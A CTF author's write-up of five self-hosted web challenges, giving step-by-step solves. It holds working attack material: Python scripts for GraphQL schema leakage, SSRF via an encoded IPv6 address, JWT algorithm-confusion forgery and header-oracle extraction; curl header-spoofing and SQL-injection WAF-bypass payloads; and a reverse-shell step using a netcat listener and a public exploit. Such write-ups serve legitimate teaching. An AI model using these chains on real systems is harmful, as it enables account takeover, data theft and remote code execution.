# I Designed 5 “Unsolvable” Web Hacking Challenges. Here’s How You Can Actually Break Them.

- **Source URL:** https://medium.com/@imaakarsh21/i-designed-5-unsolvable-web-hacking-challenges-heres-how-you-can-actually-break-them-f2669fc7402e
- **Fetched from:** https://medium.com/@imaakarsh21/i-designed-5-unsolvable-web-hacking-challenges-heres-how-you-can-actually-break-them-f2669fc7402e?source=rss-39ed816a5cd4------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14959 (id 14959)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Aakarsh Mishra / Sun, 25 Oct 2026 21:30:48 GMT

Hi guys,

This is **Aakarsh**, an ethical hacker, security researcher and bug bounty hunter, specializing in web and API security along with penetration testing. I’ve spent a good chunk of my time testing applications, hunting vulnerabilities, and understanding how real-world systems fail so they can be built back stronger. Alongside that, I’m also an active CTF player, and a member at **kBxAc**, the crew behind the event this writeup is about. 🕵️

A few days ago, our team at **kBxAc** hosted a 24-hour international CTF event, and I took full charge of designing the entire Web category, setting out to craft a true boss fight for the players.

Going into it, I thought I’d give everyone a fair workout, but it turns out I accidentally created a **digital brick wall** — Web ended up being the **least-solved** category in the entire event with just 5 total challenges standing tall till the very end! 🙈

Ever since the scoreboard froze, my DMs have been blowing up with players asking for walkthroughs… and honestly? Seeing everyone suffer together while demanding writeups made me feel a bit like:

So here we are! Grab your favorite drink, because we’re skipping the dry boring documentation and diving straight into how these 5 beasts were cracked!

**A quick disclaimer before we dive in:** everything below was built, deployed, and broken entirely inside a private, self-hosted CTF environment created specifically for this event. No real company, product, or individual was targeted, and none of the techniques here were used against any system we didn’t build and own ourselves. The vulnerabilities, payloads, and exploit chains described are for educational purposes only, to teach how these bug classes work so they can be recognized and fixed, not to encourage using them against systems you don’t have explicit permission to test. If you’re experimenting with any of this, do it only on your own infrastructure or environments you’re authorized to test. Don’t point any of this at a real target without permission — that’s illegal, and it’s also just not what this is for.

So I gave y’all a very cocky little flavor text for this one, and I stand by every word of it. The app literally tells you on the landing page: “yeah, we got hit by a nasty bug once, we patched it, we’re very proud of ourselves, move along.”

That’s not me being nice. That’s me daring you.

SecureBoard is a Next.js project-management dashboard that got hit by **CVE-2025–29927** — a real, actual, internet-breaking bug from last year where you could skip past login checks on a ton of Next.js apps just by sending one magic header (x-middleware-subrequest: middleware). The devs (me, pretending to be devs) patched it properly. I promise you, the patch is real. Go check middleware.js yourself if you don’t believe me.

Most of you tried the OG CVE payload, got a polite denial, shrugged, and started poking at /dashboard thinking that’s where the juicy stuff lives.

It is not. /dashboard is a decoy. A pretty, well-decorated decoy. I watched several of you spend actual hours in there. I felt bad. For about four seconds.🙃🙃

Here’s the thing nobody tells you about Next.js: it secretly runs on **two different engines**. Most pages run on regular Node.js. Some special pages run on something called the “Edge runtime” — lighter, faster, different rulebook entirely.

The official **CVE-2025–29927** patch only fixes the Node.js side (middleware.js). I wrote a **second**, completely separate auth check for the Edge-runtime routes — and I never patched that one. On purpose. There’s literally a TODO: verify edge runtime coverage comment sitting in my own code that nobody closed. Felt very realistic to write, not gonna lie.🙃

**Now here’s the actual bug in that unpatched check**: instead of doing a normal strict text comparison, it uses Intl.Collator with sensitivity: 'base' — a JavaScript tool meant for sorting words in different languages, where it treats accented letters as “basically the same” as their plain version. Like treating “café” and “cafe” as equal when you’re alphabetizing a list.

Cute feature. Terrible idea for a security check.

Under that comparator, middleware and mïddleware (that’s a regular i with an umlaut, U+00EF) are treated as the exact same word — even though they are, technically, two completely different strings.

My check says “yep that’s middleware, come on in.” It is not middleware. It just looks close enough to a comparator that isn’t paying attention.

**Step 1 — figure out which routes are Edge vs Node.**

Edge responses carry a Vary: ... RSC ... header plus Server-Timing. Node responses don’t. /api/admin/live is your Edge target. /dashboard is the trap I mentioned.

**Step 2 — confirm the real CVE is actually patched (sanity check):**

curl -s -H "x-middleware-subrequest: middleware" \

http://TARGET:3000/api/admin/live

**Step 3 — the “obvious” bypass, which will betray you:**

curl -H "x-middleware-subrequest: mïddleware" \

http://TARGET:3000/api/admin/live

(That’s m + ï (U+00EF) + ddleware.)

Still denied. And this is exactly where I wanted you — because curl, running in a normal terminal, silently sends that accented character as its full UTF-8 encoding (two bytes). My collator-based check only folds a single raw byte. Close enough to look right, wrong enough to fail.

Half of you found the *exact* correct character and still walked away thinking the bug was fake. It wasn’t. Your terminal just wasn’t the right tool for this particular lock.

The actual key: fire it from the browser’s own fetch() instead, where JS strings get sent as raw bytes, not re-encoded.

```
fetch('/api/admin/live', {headers:{'x-middleware-subrequest':'mïddleware'}})
  .then(r=>r.json()).then(console.log)
```
If you’re still not seeing it even with fetch() — one more trap, also intentional. The endpoint caches its response by role, computed *after* your bypass runs. So your sneaky request still gets filed under “admin,” and if a stale cached admin response is already sitting there, you’ll get served that instead of a fresh one. Fire two requests back-to-back, or wait out the 60-second cache window, and you’ll land on a fresh generation with the flag inside.

Small flex before I close this one out: an early internal draft of this challenge’s docs had ı (dotless i) listed as a valid bypass character alongside ï. It isn’t — V8’s collator doesn’t fold it the same way. Caught it in testing before anything shipped, which is exactly the kind of detail that separates a challenge that *works* from one that just *looks* like it should.☺️

Here’s exactly what we told players(the description) :

“Hark, seeker. CartographerAPI standeth as the great surveyor of the digital realm, a service that charts the projects of many a guild, rendereth their metadata into structured form, and speaketh in the tongue of graphs to all who may query it.

The architects of this service, wise in their own estimation, hath shuttered the great index of its schema; for what the querent cannot see, they reasoned, the querent cannot exploit. No map hangeth upon its wall. No directory of its halls. No ledger of its rooms.

Thou art granted the right to query. Nothing more.

What thou maketh of that right is thine own affair.”

In plain words: one GraphQL endpoint, introspection off, no docs, no schema browser. The “architects” assumed hiding the schema was the same as protecting it. It isn’t, and that gap is the whole challenge.

Most people’s first move was \_\_schema. Got blocked, assumed the whole API was a dead end, and stopped. It isn’t a dead end.

Midway through the event, We dropped this hint for stuck teams:

***carto:*** “Sometimes a service that refuses to answer directly still answers, just not in the way you expected. Listen to what it says when you ask it something almost right.”

That line is the whole solve, in one sentence. The door you’re already knocking on is talking back to you. You just have to notice how.

GraphQL servers like being helpful. Type a field name wrong, and most of them say “did you mean X?” — like autocorrect. I left that on, on purpose. So even with introspection off, you can rebuild the whole schema just by making typos and reading the corrections.

That gets you the map. Not access. For that, I added a second leak: call internalAdminView with broken input, and the resolver crashes in a specific way — leaking a mutation name that doesn’t exist anywhere in the schema you just rebuilt: syncD4t4b4s3H4sh.

That mutation takes a webhook URL and fetches it server-side. I blocklisted the obvious stuff — 127.0.0.1, localhost, 169.254, ::1. But the blocklist only checks the raw text of your URL. It never checks what that URL actually resolves to after decoding. Two different questions. I only answered one.

**Step 1 — rebuild the schema from typo suggestions.**

Each “did you mean” response leaks one real field or type name. Collect enough of them and you have the full schema — you’ll need it later, because I hash it and use that hash as part of a key you have to compute yourself.

#!/usr/bin/env python3

# Step 1 — Schema Reconstruction via Field Suggestion Oracle

import requests, hashlib, sys

TARGET = sys.argv\[1\] if len(sys.argv) > 1 else "http://TARGET:4000"

ENDPOINT = f"{TARGET}/graphql"

def gql(query):

return requests.post(ENDPOINT, json={"query": query}, timeout=10).json()

def get\_suggestion(typo\_query):

import re

resp = gql(typo\_query)

for e in resp.get("errors", \[\]):

m = re.search(r'Did you mean "(\[^"\]+)"', e.get("message", ""))

if m:

return m.group(1)

return None

probes = {

"{ projec { id } }": "project",

"{ projecst { id } }": "projects",

"{ projects { privatee } }": "private",

"{ projects { internalAdmin } }": "internalAdminView",

"{ projects { clearance } }": "clearanceData",

'{ projects(filter:{conditon:"x"}) { id } }': "condition",

}

discovered = {}

for query in probes:

s = get\_suggestion(query)

print(f"{query\[:50\]:\<52} -> {s!r}")

if s:

discovered\[s\] = True

print("Discovered fields:", list(discovered.keys()))

# Rebuild the canonical SDL from what you discovered, then hash it -

# this exact string (whitespace and order included) must match the server's.

SDL = (

"type Query { projects(filter: ProjectFilterInput): \[Project\] project(id: Int): Project } "

"type Project { id: Int name: String private: Boolean internalAdminView(config: AdminConfig): String clearanceData: String } "

"input ProjectFilterInput { condition: String } "

"input AdminConfig { mode: String }"

)

kid = "schema-" + hashlib.sha256(SDL.encode()).hexdigest()\[:16\]

print("JWT kid:", kid)

with open("/tmp/cartographer\_schema\_hash.txt", "w") as f:

f.write(kid)

**Step 2 — crash it on purpose, leak the hidden mutation name.**

`mutation { internalAdminView(config: {__invalid: true}) }`
That stack trace was never meant to reach a player in a real app. It reaches you here because I wrote it to.

**Step 3 — SSRF through an address the blocklist never checks for, then forge the admin token.**

#!/usr/bin/env python3

# Steps 2-4 — leak mutation name, SSRF the internal JWKS, forge admin JWT

import requests, json, hmac, hashlib, base64, sys, re

TARGET = sys.argv\[1\] if len(sys.argv) > 1 else "http://TARGET:4000"

ENDPOINT = f"{TARGET}/graphql"

def gql(query, token=None):

headers = {"Content-Type": "application/json"}

if token:

headers\["Authorization"\] = f"Bearer {token}"

return requests.post(ENDPOINT, json={"query": query}, headers=headers, timeout=10).json()

def b64url(data):

if isinstance(data, str):

data = data.encode()

return base64.urlsafe\_b64encode(data).rstrip(b"=").decode()

# Step 2 - crash internalAdminView to leak the hidden mutation name

resp = gql("{ project(id: 1) { internalAdminView(config: {\_\_invalid: true}) } }")

mutation\_name = None

for e in resp.get("errors", \[\]):

m = re.search(r"mutation (\w+) not found", e.get("message", ""))

if m:

mutation\_name = m.group(1)

print("Hidden mutation:", mutation\_name)

# Step 3 - SSRF via IPv6 zone-ID encoding, blocklist never sees "::1"

ssrf\_url = "http://\[::1%2580\]:8081/internal/jwks"

ssrf\_resp = gql(f'mutation {{ {mutation\_name}(input: {{webhookUrl: "{ssrf\_url}"}}) }}')

jwks\_raw = ssrf\_resp.get("data", {}).get(mutation\_name, "{}")

jwks = json.loads(jwks\_raw) if isinstance(jwks\_raw, str) else jwks\_raw

key = jwks\["keys"\]\[0\]

rsa\_pubkey\_pem = key\["x5c"\]\[0\]

with open("/tmp/cartographer\_schema\_hash.txt") as f:

kid = f.read().strip() # from Step 1 - must match exactly

# Step 4 - RS256->HS256 confusion: the "public key" text IS the HMAC secret

header = {"alg": "HS256", "typ": "JWT", "kid": kid}

payload = {"sub": "1", "role": "admin"}

signing\_input = b64url(json.dumps(header, separators=(",", ":"))) + "." + \

b64url(json.dumps(payload, separators=(",", ":")))

sig = hmac.new(rsa\_pubkey\_pem.encode(), signing\_input.encode(), hashlib.sha256).digest()

forged\_jwt = signing\_input + "." + b64url(sig)

print("Forged JWT:", forged\_jwt)

with open("/tmp/cartographer\_admin\_jwt.txt", "w") as f:

f.write(forged\_jwt)

Send a literal ::1 or 127.0.0.1, it’s blocked instantly. Send \[::1%2580\] instead — that %2580 decodes to %80, which Go treats as an IPv6 zone ID on ::1. The string ::1 never appears anywhere the blocklist actually scans. That request reaches an internal JWKS endpoint that’s otherwise unreachable from outside the container, and hands back an RSA “public key” that my verifier actually uses as a raw HMAC secret for any HS256 token whose kid starts with schema-. Get the kid wrong by even one character — because your Step 1 schema reconstruction wasn’t exact, and the forged token gets rejected.

**Step 4 — ask the flag a yes/no question, repeatedly.**

You’re admin now. Ask for the flag directly and the body always says "\[REDACTED\]". I’m not putting it in the body. I’m putting it in a header:

#!/usr/bin/env python3

# Step 5 — extract the flag through the X-Query-Cost header oracle

import requests, string, sys

TARGET = sys.argv\[1\] if len(sys.argv) > 1 else "http://TARGET:4000"

ENDPOINT = f"{TARGET}/graphql"

with open("/tmp/cartographer\_admin\_jwt.txt") as f:

ADMIN\_JWT = f.read().strip()

HEADERS = {"Content-Type": "application/json", "Authorization": f"Bearer {ADMIN\_JWT}"}

CHARSET = sorted(string.printable\[:95\]) # must be ASCII-sorted for binary search

def probe(position, candidate\_char):

query = f'{{ projects(filter: {{condition: "flag\_char\_{position}\_gte\_{ord(candidate\_char)}"}}) {{ id }} }}'

r = requests.post(ENDPOINT, json={"query": query}, headers=HEADERS, timeout=10)

return r.headers.get("X-Query-Cost", "12") == "9800" # 9800 = TRUE

def binary\_search\_char(position):

lo, hi = 0, len(CHARSET) - 1

while lo \< hi:

mid = (lo + hi) // 2

if probe(position, CHARSET\[mid\]):

lo = mid + 1

else:

hi = mid

return CHARSET\[lo - 1\] if lo > 0 else CHARSET\[0\]

flag = ""

for pos in range(100):

flag += binary\_search\_char(pos)

print(f"\[{pos:02d}\] {flag!r}")

if flag.startswith("kBxAc{") and flag.endswith("}"):

break

print("\nFLAG:", flag)

X-Query-Cost: 9800 means TRUE. 12 means FALSE. That’s the whole oracle, disguised as a database cost estimate. Binary-search each position over sorted printable ASCII and the flag comes out one letter at a time. Fully deterministic — no timing luck involved.

None of these five bugs look dangerous alone. Chained in the right order, they hand you admin access and a readable flag with zero real credentials anywhere in the process. That’s the whole point of the challenge.

Alright. Breathe for a second.

If you made it through Lazarus and Cartographer, you’ve already cleared the two nastiest things I built, those were genuinely the hardest chains in the whole category, and I watched the scoreboard barely move on either one for most of the event.

Seriously, go get a coffee if you want. You’ve earned it.

Okay. Done stalling?

Good… because OGForge is still coming for you, and this one ends in an actual root shell.

Here’s exactly what I gave players:

“⚜️ OGFORGE — The Royal Cartouche-Smithy ⚜️

In the merchant quarter of the digital realm stands OGForge, a smithy of renown, where craftsmen forge cartouches, the small bannered images that herald a link when it is shared across the kingdom’s town squares and messenger-birds. Every guildsman who passes through is granted a modest workbench of their own, free of charge, where simple cartouches may be struck.

But whispers travel the guild halls of a grander forge within — one reserved for the keepers of OGForge itself, said to work finer craft than any apprentice’s bench could manage. No signpost points the way to it. No ledger in the public hall names its door.

Thy quest, should thou accept it: prove thy mastery over the smithy, and bring back proof of thy conquest.”

Translation: it’s a link-preview-image generator. Every visitor gets their own free “project” to make cards with. Somewhere in there is a second, more powerful render pipeline that only the OGForge team is supposed to touch. I never link to it. I never name it. I just said it exists, and dared you to go find it.

Midway through, I dropped this:

***ogforge:*** “Every forge hath a back entrance for the smiths who tend it. Not all doors are made for guests.”

That’s two separate hints stacked on top of each other, and most people only caught one of them.

Three bugs. Each one boring by itself.

**Bug one:** the API that hands back your project’s details checks “are you logged in,” never “is this your project.” Your own project is 42. Nothing stops you from asking for 1 instead.

**Bug two:** the “grander forge” — the real render endpoint — decides if you’re one of its own smiths by reading the X-Forwarded-For header and checking if it says 127.0.0.1. That header exists so a proxy in front of an app can report the real visitor IP. There’s no proxy in front of this app. So nothing stops you from just writing that header yourself.

**Bug three, the expensive one:** that endpoint renders your text straight into an SVG, no escaping, and processes it with real native image libraries instead of a sandboxed renderer. That’s the exact precondition for a public, disclosed vulnerability — CVE-2026–94545 — in the image-generation library this app uses. Find the first two bugs, and you’ve unlocked the door the third one walks through.

**Step 1 — IDOR your way into project 1:**

curl http://TARGET:3000/api/projects/1

Real output, straight from a live run:

`{"id":1,"name":"OGForge Internal","owner":"internal-svc","plan":"enterprise","ogRuntime":"node","ogEndpoint":"/api/og/render","description":"OGForge platform project. Uses the dedicated Node rendering pipeline.","createdAt":"2025-01-12T09:00:00Z","updatedAt":"2026-09-29T14:22:00Z"}`
Compare that to your own project 42, which just says "ogRuntime":"edge". Project 1 is the only one running on the dangerous pipeline, and it just told you its exact endpoint.

**Step 2 — spoof your way past the “internal callers only” check:**

curl -i -X POST http://TARGET:3000/api/og/render --data "probe"

Real result: 403 Forbidden.

curl -i -X POST http://TARGET:3000/api/og/render -H "X-Forwarded-For: 127.0.0.1" --data "probe"

Real result: 200 OK, a genuine rendered PNG comes back. That’s it.

That’s the whole check, defeated with one header.

**Step 3 — the actual CVE:**

With the door open, this now matches CVE-2026–94545’s exact precondition: Node runtime, native image libraries installed, your text dropped unescaped into the rendered SVG. There’s a public, disclosed PoC for this exact bug:

git clone https://github.com/EQSTLab/CVE-2026-94545

cd CVE-2026-94545

One catch: the public PoC talks to the route directly and has no idea it needs the spoofed header from Step 2. Add it in before you fire it:

\# inside exploit.py's send\_payload(), in the headers dict:

headers = {

"Content-Type": "text/plain",

"X-Forwarded-For": "127.0.0.1",

}

Then run it against the real endpoint, with a listener waiting:

\# terminal 1

nc -lvnp 4444

# terminal 2

python3 exploit.py --target TARGET:3000 --target-path /api/og/render --lhost YOUR\_IP:4444

A successful hit replaces the worker process with your shell — the HTTP request itself dies mid-response instead of returning cleanly, which is expected, not an error. Your listener catches the connection, and from there:

id

cat /flag.txt

`kBxAc{idor_to_internal_project_plus_spoofed_x_forwarded_for_unlocks_node_og_render_then_cve_2026_94545_pops_a_root_shell}`
Three bugs that each look like a shrug on their own. An IDOR that leaks internal config. A header nobody bothered to actually protect. And a real, disclosed CVE sitting behind both of them, waiting for someone to bring the right key.

Description:

“Hark, and gather round, ye knights and dames of the interwebs! Beyond the mist lieth the Guildhall of OrbitWatch, where the Watchers of the Realm tend their beacons day and night…

Now the Guild’s Master hath proclaimed a grand tourney… whosoever can prove the Guildhall’s walls unsound shall claim the King’s Seal — a secret scroll hidden deep within the Inner Keep…

🗝️ The outer gate openeth freely — any soul may inscribe their name in the Great Ledger and wander the Hall of Pages.
🛡️ Beyond the Hall, the wards grow wary — there be chambers wherein common folk may not pass.
🏰 The Inner Keep boweth to no stranger — no road from thy camp leadeth thither, and its secrets are yielded only unto true authority. Yet even a locked keep must speak to its own kind…

Heed also this warning, traveller: the Gatekeeper watcheth the roads. Those who ride as automata, heralding their arrival in strange tongues, may find the realm answereth them with shadows. Ride as an honest pilgrim, and honest walls shalt thou see.”

Here’s what you actually land on when you open that URL:

No “CTF challenge” banner. No broken styling. No obvious “this is fake” tell anywhere. That’s deliberate, and it’s the whole design philosophy behind this one: in a real bug bounty, nobody hands you a map of which component is vulnerable. You get a polished product and zero hints about where to even start looking. I built the entire UI — landing page, auth, dashboard, admin console — to that same standard, specifically so the recon itself is part of the challenge.

Register an account, and you land on a dashboard that looks like something a real team shipped:

Fake uptime graphs, fake incidents, a fake “Starter plan” upsell nudge in the sidebar. None of it matters for the solve. All of it exists so you have to actually go looking instead of being handed a target.

Four bugs. None of them look dangerous alone, and three of them are sitting in plain sight in the UI if you know where to look.

**First Vulnerability— the token signs its own downgrade.** Go to Settings → API & Webhooks, and here’s what’s waiting for you:

A “Signature verification (RS256)” card, a public key, a “Copy key” button, and a link to GET /api/auth/pubkey — presented completely straight, like a real feature, because it is one. The problem is my JWT verifier doesn’t pin RS256. It reads whatever alg the token claims and goes with it. Feed it an HS256 token instead, and the “secret” it checks against turns out to be that exact public key text. You already have a copy. The button’s right there.

**Second Vulnerability — the admin panel reads like an open diary.** Forge your way in, and the “Internal services” table on the admin overview just tells you everything:

Notice the top-right corner, by the way — “Evil / admin.” That’s not me cleaning anything up for this writeup. That’s the actual forged session, name and all, sitting in the real UI.

The ops task board is worse (better, for you):

Real hostname, real vulnerable library version, a ticket literally titled “Upgrade node-serialize dependency in reporter” that never got closed. I wrote these the way actual engineering teams write internal tickets — a little too honest, assuming only insiders will ever read them.

**Third Vulnerability— a diagnostics tool that trusts you completely.** There’s a whole polished “Diagnostics console” feature for this:

“Run HTTP checks from the API server’s network position” — with a friendly warning box telling you not to misuse it. It’ll fetch any URL you give it, including hosts that only exist on the private network and are otherwise completely unreachable from outside.

**Fourth Vulnerability — ancient code that executes whatever you hand it.** The internal service parses config strings with node-serialize 0.0.4 — feed it a specifically-shaped string and it runs it as code, not data.

Chain all four and a stranger with no password walks out holding root.

**Step 1 — forge admin via RS256→HS256 confusion:**

pem = \<fetched from GET /api/auth/pubkey — or just click "Copy key" in Settings>

header = {"alg": "HS256", "typ": "JWT"}

payload = {"role": "admin", ...}

sig = hmac\_sha256(pem.encode(), signing\_input)

**Step 2 — recon the admin panel. Or: how I watched half the scoreboard get played by their own tools.**

This is my favorite trap in the whole event. Anything hitting /api/\* with a default scripting user-agent — bare curl, python-requests, no UA at all — gets quietly routed into a fully fake, self-consistent parallel copy of the API. Different signing key, different internal hostname, different story.

Switch to a real browser user-agent, and the real board shows up:

The flavor text literally told you this would happen — *“ride as an honest pilgrim, and honest walls shalt thou see.”*

**Step 3 — SSRF through the diagnostics console:**

`curl -X POST .../api/admin/check -d '{"url":"http://reporter:9090/health"}'`
That internal service is completely unreachable from your machine directly. The admin server just reached it for you, on command — same thing the UI version does if you’d rather click “Run check” instead.

**Step 4 — the node-serialize payload, riding the same SSRF:**

The config field has to stay a JSON string, not an object, or unserialize never sees it as a function to run. The response comes back with your command’s output sitting right there.

Four bugs, each one shrug-worthy by itself, every single one of them hiding in a UI polished enough that you’d never guess it was built to be broken. That’s the point. Real targets don’t come with a vulnerability label either.

And now coming to the end… The Solevault (honestly my personal favourite because of its design)

Here’s what we gave players,

“SoleVault — India’s newest homegrown sneaker label just dropped its SS’26 lineup. Sleek site, slick marketing… but word on the street is the team left something valuable on an internal console, and they really trust their shiny new firewall.

Find your way in. The flag is on the inside.”

And here’s what you actually land on:

A real-looking Indian D2C sneaker brand. Product grid, free shipping banner, “Built for Indian roads” copy — I spent genuine effort making this look like something that shipped out of a Bangalore startup, not a CTF box. That’s the whole point. You’re not told what’s vulnerable. You have to go find it, the same way you would on a real target.

This is the easiest challenge in the category, and it’s still the one with the single best teaching moment of the whole lineup.

There’s a staff login hiding behind /admin, linked from nowhere on the site. I put a Web Application Firewall in front of it — “SoleVault Shield,” complete with its own branding and a dedicated block page:

Here’s the actual bug: my WAF is a **blocklist of famous attack strings, not an actual SQL parser.** It recognizes 1=1, UNION SELECT, admin'--, sleep(), and every other payload copy-pasted out of a beginner tutorial, because it’s literally just matching known signatures. It has no idea what a tautology *is* — it only knows the ones it’s been shown before. I even made the block page tell you the rule name that caught you, on purpose. That’s not kindness. That’s the hint.

A tautology is just “a statement that’s always true.” 1=1 is one. So is 2=2, 47=47, any number compared to itself. My blocklist special-cases the literal number 1 because that’s the one every tutorial uses. It has genuinely never heard of 2=2.

**Step 1 — check /robots.txt, always:**

curl http://TARGET:8000/robots.txt

Real output:

Disallow: /cart

Disallow: /checkout

Disallow: /account

Disallow: /admin

Disallow: /legacy-admin

Disallow: /console

Only /admin is real. The rest are decoys that 404.

**Step 2 — try the famous payload, get named and shamed:**

curl -X POST http://TARGET:8000/admin -d "username=' or 1=1 -- &password=x"

Real result: 403, blocked, Rule SQLI-1001 · Known tautology signature. Try admin'--, different rule. Try UNION SELECT, another one. The pattern should be obvious after the third or fourth try — it’s not understanding your SQL, it’s pattern-matching strings it already knows.

**Step 3 — rename your attack, walk right in:**

curl -i -X POST http://TARGET:8000/admin -d "username=' or 2=2 -- x&password=x"

Real result: 302 Found, Location: /admin/panel, a fresh session cookie. The server builds this underneath:

SELECT \* FROM staff WHERE username='' or 2=2 -- x' AND password='x'

-- comments out the rest, 2=2 is always true, you get logged in as the first staff row in the database — no password guessed, no credentials cracked.

**Flag’s sitting right there, labeled “Compliance asset #7,” because even a CTF flag deserves a corporate disguise.**

Five minutes once you stop pasting from memory and start actually thinking about what a tautology is. That’s the entire challenge, and it’s the one I’d point a total beginner at first, it teaches the single most useful lesson in this whole category in the shortest possible time: a filter that blocks *known* bad things is not the same as a filter that understands *what bad actually is*.

Small bit of trivia on this one, because it’s too good not to share: the actual idea for this challenge’s design came from our lead(shoutout to you → **k3rn3lbr3ach3r**😉 ), who got inspired by that famous Indian meme — you know the one, Sonu, whose life goal was to take his country to **second place** after becoming an IAS Officer. When they asked him “why not first?” his answer was simply: *“that’s not my dream.”*

That’s basically SoleVault’s entire philosophy in one meme. Everyone chasing 1=1 is going for the obvious, famous, first-place answer — the one every tutorial teaches, the one every WAF signature already knows about. The actual solve was never about being the most correct tautology. 2=2 isn’t trying to be 1=1. It just needs to be *true*, not *famous*. Sonu would be proud.

If you made it through this whole thing — genuinely, a big **thank you**.

Five challenges, each one built to make you actually think instead of pattern-matching a payload off a cheat sheet and moving on, and the scoreboard this past event proved it worked. Web ended up the least-solved category by a wide margin, and honestly, that was the goal from day one.

A few quick thank-yous before I go: to everyone who got stuck, stayed up too late, tried hard, and came back the next morning anyway — that’s the only kind of player I’m actually trying to build these for.

Thanks for sharing your time reading this. I hope you enjoyed the challenges and the overall event. I will see you the next time, until then HAPPY HACKING!!

If you want to see what else we’re building, or just want to connect with me, hit me here:
